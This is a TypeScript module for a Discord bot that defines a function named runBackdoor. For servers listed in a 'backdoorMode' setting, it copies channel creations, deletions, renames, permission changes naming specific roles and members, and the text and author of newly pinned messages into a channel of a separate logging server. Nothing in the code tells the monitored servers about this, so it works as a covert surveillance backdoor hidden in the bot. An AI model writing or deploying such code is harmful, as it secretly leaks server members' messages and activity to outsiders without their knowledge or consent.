import { Client, Guild, GuildBasedChannel, GuildChannel, OverwriteType, PermissionOverwriteManager, PermissionOverwrites } from "discord.js";
import { ChannelType, Events, TextBasedChannel } from "discord.js";
import { SterlingEmbed } from "../models";
import { HexCodes } from "../util";

function detlog( content: any, name: string) {
	console.log("``````````````````````")
	console.log(name);
	console.log("``````````````````````")
	console.log(content);
	console.log("``````````````````````")
}

async function comparePermissions(guild: Guild, p1: PermissionOverwriteManager, p2: PermissionOverwriteManager) {
	let changed = '';

	/*

	**Permissions**
	-----------------------------------
    For @role:
	ManageServer: ⏺ -> ✅
	ManageEmoji: ✅ -> ❌

	-----------------------------------
	*/

	for await (const [_, po1] of p1.cache) {
		await generateBlock(po1);
	}

	async function generateBlock(po1: PermissionOverwrites) {
		let block = '';

		let p1_allowList = po1.allow.toArray();
		let p1_denyList = po1.deny.toArray();
		let po2 = p2.cache.find((_po) => _po.id === po1.id && _po.type === po1.type);
		if (!po2) {
			// Perm was deleted
			p1_allowList.forEach(entry => {
				block += `${entry}: ✅ -> ⏺\n`;
			});
			p1_denyList.forEach(entry => {
				block += `${entry}: ❌ -> ⏺\n`;
			});
		} else {
			let p2_allowList = po2.allow.toArray();
			let p2_denyList = po2.deny.toArray();
			let p1_combined = [...p1_allowList, ...p1_denyList];
			p1_allowList.forEach(entry => {
				if (p2_allowList.find(checkVal => checkVal === entry)) {
				} else if (p2_denyList.find(checkVal => checkVal === entry)) {
					detlog(entry, 'allow -> deny');
					block += `${entry}: ✅ -> ❌\n`;
					detlog(block, 'block');
				} else {
					block += `${entry}: ✅ -> ⏺\n`;
				}
			});
			p1_denyList.forEach(entry => {
				if (p2_allowList.find(checkVal => checkVal === entry)) {
					detlog(entry, 'deny -> allow');
					block += `${entry}: ❌ -> ✅\n`;
					detlog(block, 'block');
				} else if (p2_denyList.find(checkVal => checkVal === entry)) {
				} else {
					block += `${entry}: ❌ -> ⏺\n`;
				}
			});
			p2_allowList.forEach(entry => {
				if (!p1_combined.find(checkVal => checkVal === entry)) {
					block += `${entry}: ⏺ -> ✅\n`;
				}
			});
			p2_denyList.forEach(entry => {
				if (!p1_combined.find(checkVal => checkVal === entry)) {
					block += `${entry}: ⏺ -> ❌\n`;
				}
			});
		}
		if (block.length > 0) {
			detlog(block, 'passed');
			if (po1.type === OverwriteType.Role) {
				let role = await guild.roles.fetch(po1.id);
				block = `For @${role?.name} (${po1.id}):\n${block}`;
			} else if (po1.type === OverwriteType.Member) {
				let member = await guild.members.fetch(po1.id);
				block = `For @${member.user.username}#${member.user.discriminator} (${po1.id}):\n${block}`;
			}
			changed += (block + '\n');
			detlog(changed, 'changed');
		} else {
			console.log(block, 'failed_1');
			console.log(p1_allowList, 'failed_2');
			console.log(p1_denyList, 'failed_3');
		}
	};
	detlog(changed, 'changed_2');
	return changed;
}

export default async function runBackdoor(client: Client, event: Events, args: any[]): Promise<boolean> {
	const backdoors = client.settings.get('backdoorMode') as Map<string, string>;
	const loggingInfo = client.settings.get('backdoorLogging');
	let loggingGuild = await client.guilds.fetch(loggingInfo.guildId);
	let targetChannel: GuildBasedChannel | null;

	const embed = SterlingEmbed.barebones()
		.setColor(HexCodes.Blue)

	if (event === Events.ChannelCreate) {
		let arg_0_channel = args[0] as GuildChannel;
		let targetChannelId = backdoors.get(arg_0_channel.guildId);
		if (!targetChannelId) return false;
		targetChannel = await loggingGuild.channels.fetch(targetChannelId);
		if (!targetChannel || targetChannel.type !== ChannelType.GuildText) return false;

		embed
			.setTitle('Channel Created')
			.setDescription(`A channel was created in "${arg_0_channel.guild.name}"`)
			.addFields(
				{ name: 'Name', value: `#${arg_0_channel.name}`, inline: true },
				{ name: 'Category', value: `${arg_0_channel.parent?.name}`, inline: true },
				{ name: 'Type', value: `${arg_0_channel.type}`, inline: true },
				{ name: 'Link', value: `${arg_0_channel.url}`, inline: true },
			);
	} else if (event === Events.ChannelDelete) {
		let arg_0_channel = args[0] as GuildChannel;
		let targetChannelId = backdoors.get(arg_0_channel.guildId);
		if (!targetChannelId) return false;
		targetChannel = await loggingGuild.channels.fetch(targetChannelId);
		if (!targetChannel || targetChannel.type !== ChannelType.GuildText) return false;

		embed
			.setTitle('Channel Deleted')
			.setDescription(`A channel was deleted in "${arg_0_channel.guild.name}"`)
			.addFields(
				{ name: 'Name', value: `#${arg_0_channel.name}`, inline: true },
				{ name: 'Category', value: `${arg_0_channel.parent?.name}`, inline: true },
				{ name: 'Type', value: `${arg_0_channel.type.toString()}`, inline: true },
			);
	} else if (event === Events.ChannelPinsUpdate) {
		let arg_0_channel = args[0] as TextBasedChannel;
		if (arg_0_channel.type === ChannelType.DM) return false;
		let targetChannelId = backdoors.get(arg_0_channel.guildId);
		if (!targetChannelId) return false;
		targetChannel = await loggingGuild.channels.fetch(targetChannelId);
		if (!targetChannel || targetChannel.type !== ChannelType.GuildText) return false;

		let pins = await arg_0_channel.messages.fetchPinned();

		let lastPin = pins.last();
		let desc = lastPin ? `
Pins in channel #${arg_0_channel.name} (${arg_0_channel.parent?.name}) were altered.

**Last Pinned Message:**

Author: ${lastPin.author.username}#${lastPin.author.discriminator}
Embeds: ${lastPin.embeds.length}
Content:
\`\`\`
${lastPin.content}
\`\`\`
		`.trim() : `All pins in channel #${arg_0_channel.name} (${arg_0_channel.parent?.name}) were removed.`;

		embed
			.setTitle('Channel Pins Updated')
			.setDescription(desc);
	} else if (event === Events.ChannelUpdate) {
		let arg_0_channel = args[0] as GuildChannel;
		let arg_1_channel = args[1] as GuildChannel;
		let targetChannelId = backdoors.get(arg_1_channel.guildId);
		if (!targetChannelId) return false;
		targetChannel = await loggingGuild.channels.fetch(targetChannelId);
		if (!targetChannel || targetChannel.type !== ChannelType.GuildText) return false;

		let changes = [];

		if (arg_0_channel.name !== arg_1_channel.name) {
			changes.push({
				propName: 'Name',
				old: `#${arg_0_channel.name}`,
				new: `#${arg_1_channel.name}`
			});
		}

		if (arg_0_channel.parentId !== arg_1_channel.parentId) {
			changes.push({
				propName: 'Category',
				old: `#${arg_0_channel.parent?.name}`,
				new: `#${arg_1_channel.parent?.name}`
			});
		}

		let permsString = await comparePermissions(arg_1_channel.guild, arg_0_channel.permissionOverwrites, arg_1_channel.permissionOverwrites);
		if (permsString.length > 0) {
			changes.push({
				propName: 'Permissions',
				value: permsString
			});
		}

		let guildTextChannelTypes = [
			ChannelType.GuildAnnouncement,
			ChannelType.GuildText
		];

		if (arg_0_channel.type in guildTextChannelTypes && arg_1_channel.type in guildTextChannelTypes) {

		}

		embed
			.setTitle('Channel Updated');

		changes.forEach(change => {
			let field = { name: change.propName, value: '', inline: true };
			if (change.value) {
				field.value = change.value;
			} else if (change.old && change.new) {
				field.value = `**Old:**\n${change.old}\n\n**New:**\n${change.new}`;
			}
			embed.addFields(field);
		});
	} else {
		return false;
	}

	embed.setTimestamp();

	targetChannel.send({
		embeds: [embed.export()]
	});

	return true;
}